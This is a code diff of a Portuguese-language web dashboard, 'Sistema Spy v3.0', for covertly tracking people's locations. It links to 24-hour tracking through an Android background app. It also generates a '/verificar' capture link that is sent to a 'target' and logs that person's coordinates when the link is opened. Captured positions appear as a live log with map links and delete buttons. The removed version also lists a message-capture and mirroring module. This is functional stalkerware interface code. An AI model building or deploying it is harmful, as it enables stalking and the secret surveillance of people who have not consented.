@@ -5,109 +5,179 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Central de Inteligência</title>
     <script src="/socket.io/socket.io.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #00ff88; --bg: #0f0f13; --card: #1a1a20; --text: #e0e0e0; }
+        :root { --primary: #00ff88; --danger: #ff4444; --bg: #0f0f13; --card: #1a1a20; --text: #e0e0e0; }
+        
         body { margin: 0; font-family: 'Rajdhani', sans-serif; background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
         
-        header { width: 100%; padding: 20px; text-align: center; border-bottom: 1px solid #333; background: #000; }
+        header { width: 100%; padding: 20px; text-align: center; border-bottom: 1px solid #333; background: #000; box-shadow: 0 0 20px rgba(0, 255, 136, 0.1); }
         h1 { margin: 0; letter-spacing: 2px; text-transform: uppercase; color: var(--primary); }
         
-        .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; width: 90%; max-width: 1200px; margin-top: 40px; }
+        .main-container { width: 90%; max-width: 1200px; margin-top: 30px; padding-bottom: 50px; }
+
+        /* CARTÕES SUPERIORES */
+        .cards-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 40px; }
+        .card { background: var(--card); border-radius: 12px; padding: 25px; border: 1px solid #333; transition: 0.3s; }
+        .card:hover { border-color: var(--primary); }
+        .card h2 { margin-top: 0; color: #fff; border-bottom: 2px solid var(--primary); display: inline-block; }
         
-        .card { background: var(--card); border-radius: 12px; padding: 25px; border: 1px solid #333; transition: 0.3s; position: relative; overflow: hidden; }
-        .card:hover { border-color: var(--primary); box-shadow: 0 0 15px rgba(0, 255, 136, 0.1); }
-        
-        .card h2 { margin-top: 0; color: #fff; border-bottom: 2px solid var(--primary); display: inline-block; padding-bottom: 5px; }
-        .card p { color: #888; font-size: 0.9rem; }
-        
-        .btn { display: inline-block; width: 100%; padding: 12px; margin-top: 15px; background: transparent; border: 1px solid var(--primary); color: var(--primary); text-transform: uppercase; font-weight: bold; cursor: pointer; text-align: center; text-decoration: none; transition: 0.2s; border-radius: 5px; }
+        .btn { display: block; width: 100%; padding: 12px; margin-top: 15px; background: transparent; border: 1px solid var(--primary); color: var(--primary); text-transform: uppercase; font-weight: bold; cursor: pointer; text-align: center; text-decoration: none; border-radius: 5px; transition: 0.2s; }
         .btn:hover { background: var(--primary); color: #000; }
 
-        /* Estilo Específico do Módulo Link Rápido */
-        .live-status { margin-top: 15px; padding: 15px; background: #000; border-radius: 5px; font-family: monospace; font-size: 0.85rem; height: 100px; overflow-y: auto; color: #00ff88; border: 1px solid #333; }
         .input-group { display: flex; gap: 10px; margin-top: 10px; }
-        .input-link { flex: 1; background: #000; border: 1px solid #444; color: #fff; padding: 10px; border-radius: 5px; }
+        .input-link { flex: 1; background: #000; border: 1px solid #444; color: #fff; padding: 10px; border-radius: 5px; font-family: monospace; }
+
+        /* LISTA DE REGISTROS (LOGS) */
+        .logs-section { background: var(--card); border-radius: 12px; padding: 20px; border: 1px solid #333; }
+        .logs-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 15px; }
+        .logs-title { font-size: 1.2rem; color: #fff; font-weight: 700; text-transform: uppercase; }
+
+        .log-list { list-style: none; padding: 0; margin: 0; }
         
-        .blink { animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.5; } }
+        .log-item { 
+            display: flex; align-items: center; justify-content: space-between; 
+            background: #111; padding: 15px; border-radius: 8px; margin-bottom: 10px; 
+            border-left: 4px solid #444; transition: 0.3s; animation: slideIn 0.5s ease;
+        }
+        .log-item.new { border-left-color: var(--primary); background: #16221a; }
+        
+        .log-info { flex: 1; }
+        .log-time { font-size: 0.8rem; color: #888; font-family: monospace; }
+        .log-details { font-size: 1.1rem; color: #fff; font-weight: 600; margin: 5px 0; }
+        .log-provider { font-size: 0.8rem; padding: 2px 6px; border-radius: 4px; background: #333; color: #ccc; }
+        .log-provider.link { background: #003366; color: #66b3ff; }
+
+        .log-actions { display: flex; gap: 10px; }
+        
+        .btn-map { background: var(--primary); color: #000; padding: 8px 15px; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 0.9rem; }
+        .btn-del { background: #331111; color: var(--danger); border: 1px solid var(--danger); padding: 8px; border-radius: 5px; cursor: pointer; transition: 0.2s; }
+        .btn-del:hover { background: var(--danger); color: #fff; }
+
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .empty-msg { text-align: center; color: #555; padding: 20px; font-style: italic; }
     </style>
 </head>
 <body>
 
     <header>
-        <h1>Sistema Spy v2.0</h1>
+        <h1>Sistema Spy v3.0</h1>
     </header>
 
-    <div class="container">
+    <div class="main-container">
         
-        <div class="card">
-            <h2>01. Rastreamento 24h</h2>
-            <p>Monitoramento contínuo via Aplicativo Android (Background Service).</p>
-            <div style="margin-top: 20px; font-size: 0.8rem; color: #666;">STATUS: <span style="color:var(--primary)">ATIVO</span></div>
-            <a href="/gps" class="btn">Abrir Mapa Completo</a>
-        </div>
-
-        <div class="card">
-            <h2>02. Captura na Hora</h2>
-            <p>Envie o link. Ao clicar, a localização aparece aqui instantaneamente.</p>
-            
-            <div class="input-group">
-                <input type="text" id="meuLink" class="input-link" readonly value="Carregando...">
-                <button onclick="copiarLink()" class="btn" style="width: auto; margin:0;">Copiar</button>
+        <div class="cards-grid">
+            <div class="card">
+                <h2>01. Rastreamento Android</h2>
+                <p>Monitoramento 24h via App instalado.</p>
+                <a href="/gps" class="btn">Mapa Ao Vivo</a>
             </div>
 
-            <div id="live-console" class="live-status">
-                > Aguardando alvo abrir o link...
+            <div class="card">
+                <h2>02. Link de Captura</h2>
+                <p>Envie o link para capturar localização instantânea.</p>
+                <div class="input-group">
+                    <input type="text" id="meuLink" class="input-link" readonly value="...">
+                    <button onclick="copiarLink()" class="btn" style="width: auto; margin:0; padding: 10px;">COPIAR</button>
+                </div>
             </div>
-            
-            <a id="btn-maps" href="#" target="_blank" class="btn" style="display:none; background: #222; border-color: #fff; color: #fff;">Ver no Google Maps</a>
         </div>
 
-        <div class="card" style="opacity: 0.7;">
-            <h2>03. Módulo Zap</h2>
-            <p>Ferramenta de captura e espelhamento de mensagens.</p>
-            <div style="margin-top: 20px; font-size: 0.8rem; color: #666;">STATUS: <span style="color:orange">EM DESENVOLVIMENTO</span></div>
-            <a href="/zap" class="btn">Acessar Painel</a>
+        <div class="logs-section">
+            <div class="logs-header">
+                <div class="logs-title">Registros de Acesso (Logs)</div>
+                <div style="font-size: 0.9rem; color: #666;">Últimos registros salvos</div>
+            </div>
+            
+            <ul id="lista-logs" class="log-list">
+                <div class="empty-msg">Nenhum registro capturado ainda...</div>
+            </ul>
         </div>
 
     </div>
 
     <script>
         const socket = io();
-        const consoleDiv = document.getElementById('live-console');
+        const listaLogs = document.getElementById('lista-logs');
         const linkInput = document.getElementById('meuLink');
-        
-        // Define o link automaticamente baseado na URL do site
+
+        // Configura link inicial
         linkInput.value = window.location.origin + "/verificar";
 
         function copiarLink() {
             navigator.clipboard.writeText(linkInput.value);
-            alert("Link copiado! Envie para o alvo.");
+            alert("Link copiado!");
         }
 
-        function log(msg, highlight=false) {
-            const time = new Date().toLocaleTimeString();
-            const color = highlight ? '#00ff88' : '#888';
-            consoleDiv.innerHTML = `<div style="color:${color}">[${time}] ${msg}</div>` + consoleDiv.innerHTML;
+        // --- FUNÇÕES DE LOG ---
+
+        // 1. Carrega histórico quando abre a página
+        async function carregarHistorico() {
+            const res = await fetch('/api/history');
+            const dados = await res.json();
+            
+            if(dados.length > 0) {
+                listaLogs.innerHTML = ''; // Limpa msg de vazio
+                dados.forEach(registro => adicionarNaTela(registro, false));
+            }
         }
 
-        // Escuta o servidor. Se chegar dado do App ou do Link, mostra aqui
+        // 2. Cria o HTML de cada linha
+        function adicionarNaTela(data, novo=true) {
+            // Remove msg de vazio se existir
+            if(document.querySelector('.empty-msg')) listaLogs.innerHTML = '';
+
+            const isLink = data.provider.includes('link') || data.provider.includes('web');
+            const tipoLabel = isLink ? '📍 LINK WEB' : '📱 APP ANDROID';
+            const classeExtra = novo ? 'new' : '';
+            const classeProvider = isLink ? 'link' : '';
+
+            const html = `
+                <li class="log-item ${classeExtra}" id="log-${data.uuid}">
+                    <div class="log-info">
+                        <div class="log-time">${data.data_formatada}</div>
+                        <div class="log-details">Lat: ${data.lat.toFixed(5)}, Long: ${data.lng.toFixed(5)}</div>
+                        <span class="log-provider ${classeProvider}">${tipoLabel}</span>
+                        <span style="font-size:0.8rem; color:#666;">ID: ${data.id}</span>
+                    </div>
+                    <div class="log-actions">
+                        <a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" class="btn-map">ABRIR MAPA</a>
+                        <button onclick="apagarRegistro('${data.uuid}')" class="btn-del" title="Apagar Registro">🗑️</button>
+                    </div>
+                </li>
+            `;
+
+            // Adiciona no topo da lista
+            listaLogs.insertAdjacentHTML('afterbegin', html);
+        }
+
+        // 3. Função para apagar
+        async function apagarRegistro(uuid) {
+            if(confirm('Tem certeza que deseja apagar este registro?')) {
+                await fetch(`/api/history/${uuid}`, { method: 'DELETE' });
+                // O socket vai avisar pra remover da tela
+            }
+        }
+
+        // --- SOCKET.IO ---
+        
+        // Chegou novo dado (Link ou App)
         socket.on('gps_update', (data) => {
-            // Se vier do Link Web (provider: web_link), damos destaque
-            if(data.provider === 'web_link') {
-                log(`ALVO NO LINK! Lat: ${data.lat}, Long: ${data.lng}`, true);
-                
-                // Ativa o botão do Google Maps
-                const btn = document.getElementById('btn-maps');
-                btn.style.display = 'block';
-                btn.href = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
-                btn.classList.add('blink'); // Faz o botão piscar
-            } else {
-                // Se for do app android
-                log(`App Update (Moto): ${data.lat.toFixed(4)}, ${data.lng.toFixed(4)}`);
+            adicionarNaTela(data, true);
+        });
+
+        // Alguém apagou um registro
+        socket.on('registro_apagado', (uuid) => {
+            const item = document.getElementById(`log-${uuid}`);
+            if(item) {
+                item.style.opacity = '0';
+                setTimeout(() => item.remove(), 300);
             }
         });
+
+        // Inicia
+        carregarHistorico();
+
     </script>
 </body>
 </html>
